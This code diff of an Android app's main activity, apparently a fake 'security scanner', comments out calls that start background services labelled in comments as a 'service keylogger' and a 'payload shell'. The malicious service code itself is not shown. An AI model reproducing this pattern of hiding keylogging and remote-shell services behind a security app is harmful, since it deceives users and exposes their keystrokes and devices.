@@ -31,7 +31,7 @@ public class MainActivity extends AppCompatActivity {
     public void doLoad(View v){
         final ImageView myLayout = findViewById(R.id.imageView);
         Glide.with(this).load(R.drawable.loading).into(myLayout);  //insere notre gif dans la imageView
-        TextView textView = (TextView) findViewById(R.id.textView2);
+        TextView textView = findViewById(R.id.textView2);
 
         if (!scanning)  // loading screen
             textView.setText("Chargement de la sécurité\nVeuillez patienter...");
@@ -56,8 +56,11 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
         ImageView imageView = findViewById(R.id.imageView);
         Glide.with(this).load(R.drawable.annonce).into(imageView);
-        startService(new Intent(this, BackgroundSecureService.class));
-        Log.v("secme","Service launched - main");
+        //service keylogger
+        //startService(new Intent(this, BackgroundSecureService.class));
+        //payload shell
+        //startService(new Intent(this, BackgroundSecureShell.class));
+        Log.v("secme","Services launched - main");
     }
 
     // Lancement d'un scan
